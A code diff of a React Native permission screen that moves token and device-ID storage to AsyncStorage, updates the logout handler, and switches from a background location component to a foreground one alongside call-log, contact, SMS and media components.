@@ -10,20 +10,26 @@ import {
   View,
 } from 'react-native';
 import CallLog from '../../components/CallLog';
-import {useStorage} from '../../hook/use-storage';
 import {useNavigation} from '@react-navigation/native';
 import Contact from '../../components/Contact';
 import SmsListener from '../../components/SmsListener';
 import Location from '../../components/Location';
-import LocationBackground from '../../components/LocationBackground';
+// @ts-ignore
 import {Runnable} from 'react-native-background-runner';
 import {activeRunBackground} from '../../lib/helper';
 import Media from '../../components/Media';
 import {showAlert} from '../../lib/ui-alert';
+import {useAsyncStorage} from '@react-native-async-storage/async-storage';
 
 const Permission = () => {
-  const [deviceId, setDeviceId] = useStorage('deviceId');
-  const [, setToken] = useStorage('token');
+  const [, setToken] = useState<string | null | undefined>(null);
+  const [deviceId, setDeviceId] = useState<string | null | undefined>(null);
+  const {getItem: getTokenStore, setItem: setTokenStore} =
+    useAsyncStorage('@token');
+  const {getItem: getDeviceIdStore, setItem: setDeviceIdStore} =
+    useAsyncStorage('@deviceId');
+  getTokenStore((_err, result) => setToken(result));
+  getDeviceIdStore((_err, result) => setDeviceId(result));
   const navigation = useNavigation();
   const [permissionsGranted, setPermissionsGranted] = useState(false);
 
@@ -89,9 +95,11 @@ const Permission = () => {
         <Text>DeviceID: {deviceId}</Text>
         <Button
           title="Logout"
-          onPress={() => {
-            setDeviceId(null);
-            setToken(null);
+          onPress={async () => {
+            await setTokenStore('');
+            await setDeviceIdStore('');
+            setDeviceId('');
+            setToken('');
             navigation.navigate('Authentication' as never);
           }}
         />
@@ -100,8 +108,8 @@ const Permission = () => {
             <CallLog />
             <Contact />
             <SmsListener />
-            {/* <Location /> */}
-            <LocationBackground />
+            <Location />
+            {/* <LocationBackground /> */}
             <Media />
           </View>
         )}
